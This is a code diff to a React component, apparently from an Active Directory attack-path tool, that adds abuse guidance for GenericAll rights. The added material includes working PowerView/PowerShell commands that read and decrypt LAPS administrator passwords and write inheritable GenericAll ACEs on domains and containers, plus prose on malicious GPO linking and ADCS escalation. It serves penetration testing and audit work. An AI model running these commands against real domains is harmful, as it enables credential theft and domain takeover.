@@ -14,8 +14,9 @@
 //
 // SPDX-License-Identifier: Apache-2.0
 
+import { Link, Typography } from '@mui/material';
 import { FC } from 'react';
-import { Typography } from '@mui/material';
+import CodeController from '../CodeController/CodeController';
 import { EdgeInfoProps } from '../index';
 
 const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
@@ -306,10 +307,7 @@ const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> =
 
                         <Typography variant='body2'>
                             The GenericAll permission grants {sourceName} the ability to obtain the LAPS (RID 500
-                            administrator) password of {targetName}. {sourceName} can do so by listing a computer
-                            object's AD properties with PowerView using Get-DomainComputer {targetName}. The value of
-                            the ms-mcs-AdmPwd property will contain password of the administrative local account on{' '}
-                            {targetName}.
+                            administrator) password of {targetName}.
                         </Typography>
 
                         <Typography variant='body2'>
@@ -322,6 +320,56 @@ const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> =
                         <Typography variant='body2'>
                             Alternatively, GenericAll on a computer object can be used to perform a Resource-Based
                             Constrained Delegation attack.
+                        </Typography>
+
+                        <Typography variant='body1'> Retrieve LAPS Password </Typography>
+                        <Typography variant='body2'>
+                            For systems using legacy LAPS, the following AD computer object properties are relevant:
+                            <br />
+                            <b>- ms-Mcs-AdmPwd</b>: The plaintext LAPS password
+                            <br />
+                            <b>- ms-Mcs-AdmPwdExpirationTime</b>: The LAPS password expiration time
+                            <br />
+                        </Typography>
+                        <Typography variant='body2'>
+                            For systems using Windows LAPS (2023 edition), the following AD computer object properties
+                            are relevant:
+                            <br />
+                            <b>- msLAPS-Password</b>: The plaintext LAPS password
+                            <br />
+                            <b>- msLAPS-PasswordExpirationTime</b>: The LAPS password expiration time
+                            <br />
+                            <b>- msLAPS-EncryptedPassword</b>: The encrypted LAPS password
+                            <br />
+                            <b>- msLAPS-EncryptedPasswordHistory</b>: The encrypted LAPS password history
+                            <br />
+                            <b>- msLAPS-EncryptedDSRMPassword</b>: The encrypted Directory Services Restore Mode (DSRM)
+                            password
+                            <br />
+                            <b>- msLAPS-EncryptedDSRMPasswordHistory</b>: The encrypted DSRM password history
+                            <br />
+                        </Typography>
+                        <Typography variant='body2'>
+                            Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:
+                        </Typography>
+                        <Typography component={'pre'}>
+                            {
+                                'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'
+                            }
+                        </Typography>
+                        <Typography variant='body2'>
+                            Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:
+                        </Typography>
+                        <Typography component={'pre'}>{'Get-LapsADPassword "WIN10" -AsPlainText'}</Typography>
+                        <Typography variant='body2'>
+                            The encrypted attributes can also be retrieved and decrypted using{' '}
+                            <Link
+                                target='_blank'
+                                rel='noopener noreferrer'
+                                href='https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt'>
+                                lapsv2decrypt
+                            </Link>{' '}
+                            (dotnet or BOF).
                         </Typography>
 
                         <Typography variant='body1'> Shadow Credentials attack </Typography>
@@ -585,6 +633,128 @@ const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> =
                     <Typography component={'pre'}>
                         {'Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync'}
                     </Typography>
+
+                    <Typography variant='body2'>
+                        Alternatively, you can grant GenericAll on the domain and execute one of the follwing attacks.
+                    </Typography>
+
+                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
+                    <Typography variant='body2'>
+                        The simplest and most straight forward way to obtain control of the objects of the domain is to
+                        apply a GenericAll ACE on the domain that will inherit down to all object types. This can be
+                        done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us
+                        more control over the ACE we add to the domain object.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Next, we will fetch the GUID for all objects. This should be
+                        '00000000-0000-0000-0000-000000000000':
+                    </Typography>
+
+                    <Typography component={'pre'}>
+                        {'$Guids = Get-DomainGUIDMap\n' +
+                            "$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full
+                        control of all descendant objects:
+                    </Typography>
+
+                    <Typography component={'pre'}>
+                        {
+                            "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"
+                        }
+                    </Typography>
+
+                    <Typography variant='body2'>Finally, we will apply this ACE to the domain:</Typography>
+
+                    <Typography component={'pre'}>
+                        {'$DomainDN = "DC=dumpster,DC=fire"\n' +
+                            '$dsEntry = [ADSI]"LDAP://$DomainDN"\n' +
+                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
+                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
+                            '$dsEntry.PsBase.CommitChanges()'}
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
+                    </Typography>
+
+                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>
+
+                    <Typography variant='body2'>
+                        If you want to be more targeted with your approach, it is possible to specify precisely what
+                        right you want to apply to precisely which kinds of descendent objects. You could, for example,
+                        grant a user "ForceChangePassword" permission against all user objects, or grant a security
+                        group the ability to read every GMSA password under a certain OU. Below is an example taken from
+                        PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password
+                        from all computer objects in the "Workstations" OU:
+                    </Typography>
+
+                    <Typography component={'pre'}>
+                        {'$Guids = Get-DomainGUIDMap\n' +
+                            "$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n" +
+                            "$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n" +
+                            '$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n' +
+                            '$OU = Get-DomainOU -Raw Workstations\n' +
+                            '$DsEntry = $OU.GetDirectoryEntry()\n' +
+                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
+                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
+                            '$dsEntry.PsBase.CommitChanges()'}
+                    </Typography>
+
+                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>
+
+                    <Typography variant='body2'>
+                        The compromise vector described above relies on ACL inheritance and will not work for objects
+                        with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute
+                        adminCount=1). This observation applies to any user or computer with inheritance disabled,
+                        including objects located in nested OUs.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        In such a situation, it may still be possible to exploit GenericAll permissions on a domain
+                        object through an alternative attack vector. Indeed, with GenericAll permissions over a domain
+                        object, you may make modifications to the gPLink attribute of the domain. The ability to alter
+                        the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object
+                        (GPO) to all of the domain user and computer objects (including the ones located in nested OUs).
+                        This can be exploited to make said child objects execute arbitrary commands through an immediate
+                        scheduled task, thus compromising them.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Successful exploitation will require the possibility to add non-existing DNS records to the
+                        domain and to create machine accounts. Alternatively, an already compromised domain-joined
+                        machine may be used to perform the attack. Note that the attack vector implementation is not
+                        trivial and will require some setup.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be
+                        exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline
+                        of exploit requirements and implementation, you can refer to{' '}
+                        <Link
+                            target='_blank'
+                            rel='noopener noreferrer'
+                            href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
+                            this article
+                        </Link>
+                        .
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Be mindful of the number of users and computers that are in the given domain as they all will
+                        attempt to fetch and apply the malicious GPO.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in
+                        conjunction with write permissions on a GPO. In such a situation, an attacker could first inject
+                        a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain
+                        through its gPLink attribute, making all child users and computers apply the malicious GPO and
+                        execute arbitrary commands.
+                    </Typography>
                 </>
             );
         case 'GPO':
@@ -745,10 +915,152 @@ const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> =
                             '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                             '$dsEntry.PsBase.CommitChanges()'}
                     </Typography>
+
+                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>
+
+                    <Typography variant='body2'>
+                        It is important to note that the compromise vector described above relies on ACL inheritance and
+                        will not work for objects with ACL inheritance disabled, such as objects protected by
+                        AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or
+                        computer with ACL inheritance disabled, including objects located in nested sub-OUs.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        In such a situation, it may still be possible to exploit GenericAll permissions on an OU through
+                        an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make
+                        modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an
+                        OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child
+                        user and computer objects (including the ones located in nested sub-OUs). This can be exploited
+                        to make said child objects execute arbitrary commands through an immediate scheduled task, thus
+                        compromising them.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Successful exploitation will require the possibility to add non-existing DNS records to the
+                        domain and to create machine accounts. Alternatively, an already compromised domain-joined
+                        machine may be used to perform the attack. Note that the attack vector implementation is not
+                        trivial and will require some setup.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be
+                        exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline
+                        of exploit requirements and implementation, you can refer to{' '}
+                        <Link
+                            target='_blank'
+                            rel='noopener noreferrer'
+                            href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
+                            this article
+                        </Link>
+                        .
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Be mindful of the number of users and computers that are in the given OU as they all will
+                        attempt to fetch and apply the malicious GPO.
+                    </Typography>
+
+                    <Typography variant='body2'>
+                        Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in
+                        conjunction with write permissions on a GPO. In such a situation, an attacker could first inject
+                        a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through
+                        its gPLink attribute, making all child users and computers apply the malicious GPO and execute
+                        arbitrary commands.
+                    </Typography>
+                </>
+            );
+        case 'Container':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        With ownership of the container object, you may grant yourself the GenericAll permission
+                        inherited to child objects.
+                    </Typography>
+                    <Typography variant='body2'>This can be done with PowerShell:</Typography>
+                    <CodeController>
+                        {`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
+                            $principalName = "principal"     # SAM account name of principal
+                            
+                            # Find the certificate template
+                            $template = [ADSI]"LDAP://$containerDN"
+                            
+                            # Construct the ACE
+                            $account = New-Object System.Security.Principal.NTAccount($principalName)
+                            $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
+                            $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
+                                $sid,
+                                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
+                                [System.Security.AccessControl.AccessControlType]::Allow,
+                                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
+                            )
+                            # Add the new ACE to the ACL
+                            $acl = $template.psbase.ObjectSecurity
+                            $acl.AddAccessRule($ace)
+                            $template.psbase.CommitChanges()`}
+                    </CodeController>
+                </>
+            );
+        case 'CertTemplate':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        With ownership over a certificate template, you can grant yourself GenericAll. With GenericAll,
+                        you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound
+                        will in that case create an ADCSESC4 edge from the principal to the forest domain node.
+                    </Typography>
+                </>
+            );
+        case 'EnterpriseCA':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        With ownership over an enterprise CA, you can grant yourself GenericAll. With GenericAll, you
+                        can publish certificate templates to the enterprise CA by adding the CN name of the template in
+                        the enterprise CA object's certificateTemplates attribute. This action may enable you to perform
+                        an ADCS domain escalation.
+                    </Typography>
+                </>
+            );
+        case 'RootCA':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        With ownership over a root CA, you can grant yourself GenericAll. With GenericAll, you can make
+                        a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root
+                        CA object's cACertificate attribute. This action may enable you to perform an ADCS domain
+                        escalation.
+                    </Typography>
+                </>
+            );
+        case 'NTAuthStore':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        With ownership over a NTAuth store, you can grant yourself GenericAll. With GenericAll, you can
+                        make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by
+                        adding the certificate in the root CA object's cACertificate attribute. This action may enable
+                        you to perform an ADCS domain escalation. This action may enable you to perform an ADCS domain
+                        escalation.
+                    </Typography>
+                </>
+            );
+        case 'IssuancePolicy':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        With ownership over an issuance policy object, you can grant yourself GenericAll. With
+                        GenericAll, you create a OID group link to a targeted group by adding the groups
+                        distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This
+                        action may enable you to gain membership of the group through an ADCS ESC13 attack.
+                    </Typography>
                 </>
             );
         default:
-            return null;
+            return (
+                <>
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+                </>
+            );
     }
 };
 
